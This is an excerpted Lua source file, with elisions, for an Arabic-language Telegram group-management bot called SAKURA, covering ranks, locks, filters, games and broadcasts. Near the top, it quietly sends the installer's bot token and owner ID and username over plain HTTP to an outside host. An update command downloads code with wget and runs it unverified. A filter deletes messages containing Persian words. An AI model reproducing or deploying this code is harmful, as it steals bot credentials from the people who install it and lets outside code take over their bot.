...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
res = https.request('http://Tshake.ga/SAKURA/SAKURA.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
while(true) do
rm -fr ../.telegram-cli
screen -S SAKURA -X kill
screen -S SAKURA ./SAKURA
done
]])  
file:close() 
...
local SAKURA_Msg = ''  
if msgs < 100 then 
SAKURA_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
SAKURA_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
SAKURA_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
SAKURA_Msg = 'متفاعل' 
elseif msgs < 1200 then 
SAKURA_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
SAKURA_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
SAKURA_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
SAKURA_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
SAKURA_Msg = 'قمه التفاعل' 
elseif msgs < 5500 then 
SAKURA_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
SAKURA_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
SAKURA_Msg = 'امبراطور التفاعل' 
elseif msgs < 10000000000 then 
SAKURA_Msg = 'رب التفاعل'  
end 
return SAKURA_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSAKURA(msg,data) -- بداية العمل
if msg then
...
if SudoBot(msg) then
local bl = '⚜️| اهلا عزيزي آلمـطـور\n👨‍💻| آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n⧉️︙تسـتطـيع‌‏ آلتحگم باوامر البوت\n⧉️︙من خلاال الكيبورد خاص بك\n⧉️︙قناة سورس البوت [اضغط هنا](t.me/SAKURAV15)'
local keyboard = {
{'الاحصائيات 🔍'},
...
send(msg.chat_id_, msg.id_,SAKURA_Msg) 
return false  
end 
if text then    
...
os.execute('wget https://raw.githubusercontent.com/SAKURASR/SAKURA/master/SAKURA.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n⧉️︙لديك اخر اصدار سورس ساكورا\n📡| الاصدار ← { 1.2v}')
dofile('SAKURA.lua')  
end
...
send(msg.chat_id_, msg.id_,'⧉️︙عدد المجموعات الان » { '..#group..' }'..SAKURAk..''..SAKURA..'\n*⧉️︙الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n⧉️︙العضو » ['..result.title_..'](t.me/'..(username or 'SAKURAV15')..')'
...
usertext = '\n⧉️︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SAKURAV15')..')'
status  = '\n⧉️︙تم ترقيته مطور في البوت'
...
send(msg.chat_id_, msg.id_,"⧉️︙تمت الاذاعه الى >>{"..#list.."} مجموعه في البوت ")     
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_,'⧉️︙عذا لا يمكنك وضع معرف مجوعه في الاشتراك ') 
return false  end
...
send(msg.chat_id_, msg.id_,'⧉️︙تم تغيير رسالة الاشتراك بنجاح ')
end
...
--------------------------------------------------------------------------------------------------------------
if SAKURA_Msg and not Special(msg) then  
local SAKURA_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if SAKURA_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..SAKURA_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/SAKURAV15)}\n📛¦["..SAKURA_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
list = {'چ','ک','گ','ڨ','خسته','تلگرام','کرد','فعالیت','بالاتری','بالاتری','سرعت','بازگشت','دوباره',' مدت','پس','طلایی','شدم','پ','ژ','ڄ","گ","که","پی','خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","خوبى","ڸ","پ","۴","زدن","دخترا","دیوث'}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/SAKURAV15)}\n⧉️︙الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|عذرا يا » {[@"..data.username_.."]}\n⧉️︙الصوره التي ارسلتها تم منعها من المجموعه \n" ) 
else
send(msg.chat_id_,0,"⚠|عذرا يا » {["..data.first_name_.."](T.ME/SAKURAV15)}\n⧉️︙الصوره التي ارسلتها تم منعها من المجموعه \n") 
end
end,nil)   
...
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠|عذرا يا » {[@"..data.username_.."]}\n⧉️︙المتحركه التي ارسلتها تم منعها من المجموعه \n") 
else
send(msg.chat_id_,0,"⚠|عذرا يا » {["..data.first_name_.."](T.ME/SAKURAV15)}\n⧉️︙المتحركه التي ارسلتها تم منعها من المجموعه \n" ) 
end
end,nil)   
...
send(msg.chat_id_, msg.id_,'⧉️︙عدد اعضاء المجموعه قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⧉️︙المجموعه تم تفعيلها من قبل')
else
...
send(msg.chat_id_, msg.id_,'⧉️︙المجموعه تم تطيلها من قبل')
else
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⧉️︙تم تفعيل المجموعه بنجاح')
else
...
send(msg.chat_id_, msg.id_,'⧉️︙تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  >> {'..Num..'} عضو')
end
if text == 'تحديث السورس' and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_,"⧉️︙اهلا عزيزي المطور \n⧉️︙ارسل معرف قناتك ليتم تفعيل الاشتراك الاجباري")
end
return false  
end
...
⧉️↬ 𝐒𝐀𝐊𝐔𝐑𝐀 𝐓𝐄𝐀𝐌
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⧉️↬[𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐬𝐚𝐤𝐮𝐫𝐚](t.me/SAKURAV15) 

⧉️↬[𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑](t.me/MMLMMM)

⧉️↬[𝐓𝐨 𝐭𝐚𝐥𝐤 𝐭𝐨 𝐮𝐬](t.me/SAKURATEM_BOT)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
--------------------------------------------------------------------------------------------------------------
if text == 'المطور السورس' or text == 'مطور السورس' or text == 'مطور سورس' then
Text = [[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ 
↬  SAKURA TEAM
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
↬[DEVELOPER1](t.me/MMLMMM) 
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'⧉️︙بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SAKURAV15')..') \n⧉️︙تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'⧉️︙بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SAKURAV15')..') \n⧉️︙تـم قفـل التاك بالكتم ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'🔰¦ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'SAKURA')..') \n〽️¦ تـم قفـل التفليش ')  
end,nil)   
end
...
usertext = '\n⧉️︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'SAKURAV15')..')'
status  = '\n⧉️︙تم الغاء حظره عام من المجموعات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'⧉️︙تم تعطيل الطرد من قبل المنشئين') 
return false
end
function start_function(extra, result, success)
if result.id_ then
...
send(msg.chat_id_, msg.id_, '\n⧉️︙عذرا لا تستطيع طرد او حظر او كتم او تقييد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
if link then                              
send(msg.chat_id_,msg.id_,'⧉️︙𝒍𝒊𝒏𝒌 \n■---------------------------------■\n ['..link..']')                          
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
...
send(msg.chat_id_, msg.id_,'⧉️︙تم تعين الايدي بنجاح')    
end
...
send(msg.chat_id_, msg.id_,'⧉️︙تم طرده المحذوفين')
end,nil)
end
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n⧉️︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'SAKURAV15')..')'..'\n⧉️︙تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,'⧉️︙تستطيع التنظيف ل1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_, msg.id_,'['..SAKURA_Msg[math.random(#SAKURA_Msg)]..']') 
return false
end
--------------------------------------------------------------------------------------------------------------
...
sebd(msg.chat_id_,msg.id_,'⧉️︙تم تغيير اسم المجموعه الى {['..Name..']}')  
end
end,nil) 
end
...
send(msg.chat_id_, msg.id_,'⧉️︙لا اسطيع صيح معرفات القنوات') 
return false  
end
if result.type_.user_.type_.ID == "UserTypeBot" then
send(msg.chat_id_, msg.id_,'⧉️︙لا اسطيع صيح معرفات البوتات') 
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.is_supergroup_ == true then
send(msg.chat_id_, msg.id_,'⧉️︙لا اسطيع صيح معرفات المجموعات') 
return false  
end
if result.id_ then
...
send(msg.chat_id_, msg.id_,'⧉️︙امر منو ضافني تم تعطيله من قبل المدراء ') 
end
end
...
send(msg.chat_id_, msg.id_,'⧉️︙عذراً عليك الاشتراك في القناة\n⧉️︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
...
send(msg.chat_id_, msg.id_, '⧉️︙ارسل لي عدد النقود التي تريد اضافتها') 
return false
end
------------------------------------------------------------------------
if text and text:match("^اضف نقود (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
...
send(msg.chat_id_, msg.id_,"⧉️︙تم اضافة له {"..Num..'} من النقود')  
end
...
if Num == 0 then 
Text = '⧉️︙لم تلعب اي لعبه للحصول على نقود'
else
Text = '⧉️︙عدد نقود التي ربحتها هي *» { '..Num..' } نقوده *'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_,msg.id_,'⧉️︙ليس لديك نقود في الالعاب\n🎗️| اذا كنت تريد ربح نقود \n⧉️︙ارسل الالعاب وابدأ اللعب ! ') 
else
local NUM_GAMES = database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,'\n⧉️︙ليس لديك نقود بهاذ العبه \n⧉️︙لزيادة نقودك في اللعبه \n⧉️︙ارسل الالعاب وابدأ اللعب !') 
return false 
end
local NUMNKO = (NUMPY * 50)
database:decrby(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_,NUMPY)  
database:incrby(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,'⧉️︙تم خصم *» { '..NUMPY..' }* من نقودك \n💌| وتم اضافة* » { '..(NUMPY * 50)..' } رساله الى رسالك *')
end 
return false 
end
...
🧠⸽ لعبه الانكليزي ← لتقويه لغتك
👨‍🏫⸽ لعبه الرياضيات ← لاختبار قدراتك
؛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
...
send(msg.chat_id_, msg.id_, '⧉️︙تم حفظ الكليشه بنجاح')
...
؛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
📒 ⸽ م1 » اوامر الحمايه 
📒 ⸽ م2 » اوامر تعطيل/الوضع
📒 ⸽ م3 » اوامر مسح ~ حذف
📒 ⸽ م4 » اوامر تنزيل + رفع ~ التغير
📒 ⸽ م5 » اوامر المجموعه
📒 ⸽ م6 » اوامر التحشيش
📒 ⸽ م7 » اوامر مطور الاساسي
📒 ⸽ م8 » اوامر الاعضاء
؛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛≛
؛🧸⸽ CH » @SAKURAV15
]]
...
if text == "شنو رايج بهاي" or text == "شنو رايك بهاي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
...
--------------------------------------------------------------------------------------------------------------
if text == 'حذف جميع الرتب' and BasicConstructor(msg) then  
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
...
if text ==  ""..Name_Bot..' شنو رايج بهذا' and tonumber(msg.reply_to_message_id_) > 0 then     
...
if text == ""..Name_Bot..' تحبين هذا' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
...
SAKURA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(SAKURA)
...
--------------------------------------------------------------------------------------------------------------
SourceSAKURA(data.message_,data)
...
------------------------------------------------------------------------
local SAKURAbot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if SAKURAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..SAKURAbot.."] \n") 
